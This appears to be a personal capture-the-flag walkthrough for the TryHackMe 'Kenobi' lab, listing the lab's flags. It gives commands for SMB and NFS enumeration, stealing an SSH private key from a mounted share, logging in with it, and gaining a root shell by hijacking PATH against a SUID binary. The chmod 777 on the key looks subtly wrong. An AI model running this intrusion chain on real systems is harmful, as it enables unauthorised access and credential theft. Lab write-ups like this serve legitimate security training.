## TRYHACKME - Kenobi ##
# // <------------> \\ #

~~~COMPLETED ON 3/3/21, ezyhcks

```
	//STEPS\\

## GET INFO ON DEVICE ##

1. nmap scan

2. check amount of samba ports

3. log in anonymously into samba; ~smbclient //<ip>/anonymous~

4. check FTP port number "21"

5. use nmap to see unmounted system;   ~nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <ip>~

## GET ACCESS TO THE DEVICE ##

6. mount the device to your machine;   ~sudo mkdir /mnt/kenobiNFS
										mount <ip>:/var /mnt/kenobiNFS
										ls -la /mnt/kenobiNFS~

7. copy the Private_Key into the
   working directory and give it the   ~cp /mnt/kenobiNFS/tmp/id_rsa .
   right permissions;				   sudo chmod 777 id_rsa

8. now ssh into the kenobi user;       ~ssh -i id_rsa kenobi@<ip>~

9. get the user flag
   USER=d0b0f3f53b6caa532a83915e19224899

## GET ROOT PERMS ##

10. run a command to see for any       ~find / -perm -u=s -type f 2>/dev/null~
    privesc's;

11. time to get a shell to run         ~echo /bin/sh > curl~
	commands;						    chmod 777 curl
										export PATH=/tmp:$PATH
										/usr/bin/menu
										!!CHOOSE 1!!~

12. cat the root flag;                 ~cat /root/root.txt~
	ROOT=177b3cd8562289f37382721c28381f02

```
